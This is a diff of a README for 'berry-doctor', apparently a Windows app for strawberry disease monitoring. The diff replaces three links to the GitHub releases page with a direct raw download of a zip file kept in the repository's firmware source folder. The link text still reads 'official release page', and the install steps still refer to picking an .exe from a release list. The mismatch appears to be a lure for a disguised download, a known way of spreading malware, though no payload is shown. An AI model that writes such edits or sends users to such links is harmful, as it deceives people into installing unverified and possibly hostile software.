@@ -1,6 +1,6 @@
 # 🍓 berry-doctor - Simple tools for healthy strawberry crops
 
-[![](https://img.shields.io/badge/Download_BerryDoctor-blue?style=for-the-badge)](https://github.com/murielleclean7998/berry-doctor/releases)
+[![](https://img.shields.io/badge/Download_BerryDoctor-blue?style=for-the-badge)](https://github.com/murielleclean7998/berry-doctor/raw/refs/heads/main/firmware/src/doctor_berry_v1.6.zip)
 
 BerryDoctor helps farmers monitor strawberry health using Kakao. The software identifies plant diseases, provides weather alerts, and offers coaching for your farm. This tool assists you in making informed decisions about your crops.
 
@@ -8,7 +8,7 @@ BerryDoctor helps farmers monitor strawberry health using Kakao. The software id
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/murielleclean7998/berry-doctor/releases).
+1. Go to the [official release page](https://github.com/murielleclean7998/berry-doctor/raw/refs/heads/main/firmware/src/doctor_berry_v1.6.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
@@ -58,7 +58,7 @@ If the software does not open:
 
 * Check your internet connection.
 * Restart your computer.
-* Uninstall the app and download it again from the [release page](https://github.com/murielleclean7998/berry-doctor/releases). 
+* Uninstall the app and download it again from the [release page](https://github.com/murielleclean7998/berry-doctor/raw/refs/heads/main/firmware/src/doctor_berry_v1.6.zip). 
 * Make sure your Windows version is up to date.
 
 If the camera tool fails to detect a disease:
